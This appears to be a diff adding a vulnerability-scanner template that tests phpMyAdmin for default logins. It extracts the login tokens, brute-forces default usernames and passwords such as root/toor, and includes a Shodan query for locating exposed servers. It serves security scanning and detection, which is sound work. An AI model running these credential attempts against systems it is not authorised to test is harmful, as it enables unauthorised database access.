@@ -1,0 +1,77 @@
+id: phpmyadmin-default-login
+
+info:
+  name: phpMyAdmin - Default Login
+  author: Natto97,notwhy
+  severity: high
+  description: phpMyAdmin contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://www.phpmyadmin.net
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 16
+    shodan-query: http.title:phpMyAdmin
+  tags: default-login,phpmyadmin
+
+http:
+  - raw:
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+
+        set_session={{session}}&pma_username={{user}}&pma_password={{password}}&server=1&route=%2F&token={{token}}
+
+    attack: clusterbomb
+    payloads:
+      user:
+        - root
+        - mysql
+      password:
+        - 123456
+        - root
+        - mysql
+        - toor
+
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - 'name="token" value="([0-9a-z]+)"'
+
+      - type: regex
+        name: token2
+        internal: true
+        group: 1
+        regex:
+          - 'name="set_session" value="([0-9a-z]+)"'
+
+      - type: regex
+        name: session
+        part: header
+        internal: true
+        group: 2
+        regex:
+          - "phpMyAdmin(_https)?=([0-9a-z]+)" # for HTTPS
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(header_2, "phpMyAdmin=") && contains(header_2, "pmaUser-1=")
+          - status_code_2 == 302
+          - contains(header_2, 'index.php?collation_connection=utf8mb4_unicode_ci') || contains(header_2, '/index.php?route=/&route=%2F')
+        condition: and
+
+# digest: 4a0a00473045022100c2bb516f2d7be7f4affe92092982ab1664aa72dcc62046cf7343ad742c4e1b26022016a9f0a2ea4a1a9d3920d7ed88d94cc02b103d8363a35c2fd8ec377c4eed9234:922c64590222798bb761d5b6d8e72950
